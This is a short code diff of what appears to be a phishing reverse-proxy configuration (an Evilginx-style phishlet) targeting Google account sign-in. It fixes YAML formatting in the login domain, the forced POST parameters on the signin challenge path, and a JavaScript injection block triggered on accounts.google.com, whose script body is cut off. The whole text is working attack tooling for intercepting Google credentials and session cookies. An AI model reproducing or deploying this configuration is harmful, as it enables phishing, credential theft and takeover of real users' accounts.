@@ -45,8 +45,7 @@ auth_urls:
 - '/CheckCookie' 
 - '/ManageAccount' 
 login: 
-domain: 
-'accounts.google.com' 
+domain: 'accounts.google.com' 
 path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin' 
 force_post: 
 - path: '/_/signin/sl/challenge' 
@@ -55,7 +54,8 @@ search:
 - {key: 'continue', search: '.*'} 
 force: 
 - {key: 'continue', value: ''} 
-type: 'post' js_inject: 
+type: 'post' 
+js_inject: 
 - trigger_domains: ['accounts.google.com'] 
 trigger_paths: ['.*?'] 
 script: | 
